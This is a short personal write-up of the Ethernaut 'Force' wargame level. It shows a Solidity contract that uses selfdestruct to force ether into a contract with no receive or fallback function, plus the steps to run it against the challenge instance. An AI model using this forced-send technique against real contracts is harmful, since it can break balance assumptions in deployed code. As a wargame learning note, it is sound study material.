## Force

1. I never tried to force send eth in any contract that does not have receive() or fallback() but it can be done using selfdestruct(). Maybe I heard this from austin griffith... i don't remember

> Code :

```solidity
contract ForceSend {
    receive() payable external {}

    function funcAttack(address _newO) public {
        selfdestruct(payable(_newO));
    }
}
```

2. First send some eth in ForceSend using your metamask and then call the funcAttack with the challenge instance Address.

> Note: I passed the challenge but i tried calling funcAttack() again and it is working even after self destruct i wonder why... reference again

3. success
